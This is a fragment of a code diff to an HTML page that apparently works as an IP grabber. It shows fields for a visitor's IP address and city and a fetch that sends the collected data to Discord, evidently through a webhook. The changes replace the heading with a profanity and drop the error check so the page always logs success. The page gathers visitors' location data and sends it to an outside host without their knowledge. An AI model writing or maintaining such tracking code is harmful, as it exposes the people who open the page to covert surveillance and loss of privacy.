@@ -22,7 +22,7 @@
     </style>
 </head>
 <body>
-    <h1>Gathering Your Info...</h1>
+    <h1>Fucked</h1>
     <div id="info">
         <p id="ip">IP Address: </p>
         <p id="city">City: </p>
@@ -98,11 +98,7 @@
                     body: JSON.stringify(message)
                 })
                 .then(response => {
-                    if (response.ok) {
-                        console.log('Message sent to Discord');
-                    } else {
-                        console.log('Error sending message to Discord');
-                    }
+                    console.log('Message sent to Discord');
                 })
                 .catch(error => console.error('Error:', error));
             })
